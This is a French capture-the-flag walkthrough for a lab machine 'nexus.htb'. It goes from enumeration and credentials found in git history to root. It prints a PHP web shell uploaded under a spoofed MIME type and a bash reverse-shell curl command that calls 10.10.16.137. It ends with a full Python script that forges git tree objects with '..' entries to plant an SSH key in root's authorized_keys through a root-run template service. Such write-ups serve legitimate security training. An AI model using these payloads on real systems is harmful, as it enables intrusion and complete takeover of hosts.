# Port enum:
```bash
nmap -p- nexus.htb
```

# Subdomain enum:
```bash
wfuzz -c --hw 10 -Z -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.nexus.htb" http://nexus.htb 
```

# DB Password:
Aller sur le git regarder l'history du .env et boom

# Version de krayin CRM:
Se logger sur billing avec le mail trouvé (j.matthew@nexus.htb) et le mot de passe (N27xh!!2ucY04)

# Exploitation CVE-2026-38526
Dans le formulaire d'envoie de mail il y a un endroit pour upload une PJ.
On crée `shell.php`

```php
<?php system($_GET['cmd']); ?>
```

Puis avec burp suit on intercept l'upload du fichier pour changer le mime type par image/png. On récupère l'URL de retour avec le chemin et boom
On écoute avec netcat
```bash
nc -lvnp 4444
```

Puis on execute
```bash
curl -G "http://billing.nexus.htb/storage/tinymce/861103c6ece20a3cc9d1ecbf09bb3045.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.137/4444 0>&1'"
```

# Obtenir le mdp de jones
Une fois dans le reverse shell, on regarde dans /var/www et on voit un dossier krayin. Dans le dossier krayin il y a un .env avec un nouveau mdp (y27xb3ha!!74GbR). Si on tente de ssh dans la vm avec le user jones et le mdp on voit que ça passe sans souci. Le flag est dans un txt dans le home de jones

# Timer de con
```bash
systemctl list-timers --all
```

gitea-template-sync.service

# Connexion en root
En créant un repo template, il sera lu et executé par le service qui tourne en root. On peut donc via un script venir injecter une clé ssh dans le `authorized_key` de root pour ensuite pour ssh dedans. 

un dépôt Git stocke son contenu sous forme d'objets `tree`, qui sont de simples listes `(mode, nom, hash)`. Si un service (forge Git, système de templates, hook) reconstruit ou extrait ces objets sur le disque sans valider les noms d'entrées, rien n'empêche de forger un arbre contenant des entrées `..` imbriquées, ce qui permet d'écrire des fichiers en dehors du répertoire du dépôt. Si ce service tourne avec des privilèges élevés (root), un dépôt malveillant peut ainsi déposer un fichier arbitraire ailleurs sur le système (ex : une clé SSH dans `/root/.ssh/authorized_keys`), menant à une prise de contrôle totale.

```python
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time

def write_obj(data,t):
    h=("%s %d"%(t,len(data))).encode()+b"\x00"
    s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2])
    os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p):
        open(p,"wb").write(zlib.compress(s))
    return sha

def entry(mode,name,sha):
    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo");sys.exit(1)

r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
if r.returncode!=0:
    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1)
key=r.stdout.strip()+"\n"

blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):
    fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)
```